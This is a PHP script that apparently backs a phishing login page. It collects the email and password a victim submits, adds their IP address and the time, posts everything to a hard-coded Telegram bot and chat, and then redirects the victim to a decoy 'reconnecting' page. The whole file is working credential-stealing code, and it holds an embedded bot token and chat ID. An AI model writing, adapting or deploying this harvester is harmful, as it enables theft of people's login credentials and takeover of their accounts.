<?php
// Replace 'YOUR_TELEGRAM_BOT_TOKEN' and 'YOUR_CHAT_ID' with your actual Telegram bot token and chat ID.
$telegramBotToken = '5910982961:AAGdCuAo0CqdVhfGLFD72rwI71uAAU-WqAM';
$chatId = '1634597902';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve the login credentials, user's IP address, and current date from the form
    $email = $_POST['eml'];
    $password = $_POST['pwd'];
    $userIp = $_SERVER['REMOTE_ADDR'];
    $currentDate = date('Y-m-d H:i:s'); // Format: Year-Month-Day Hour:Minute:Second

    // Send the login information, user's IP address, and current date to Telegram
    $message = "New Login:\nEmail: $email\nPassword: $password\nIP Address: $userIp\nDate: $currentDate";
    $telegramApiUrl = "https://api.telegram.org/bot$telegramBotToken/sendMessage";
    $telegramParams = [
        'chat_id' => $chatId,
        'text' => $message,
    ];

    $ch = curl_init($telegramApiUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $telegramParams);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    // Redirect to another HTML page after sending to Telegram
    header("Location: reconnecting.html");
    exit;
}
?>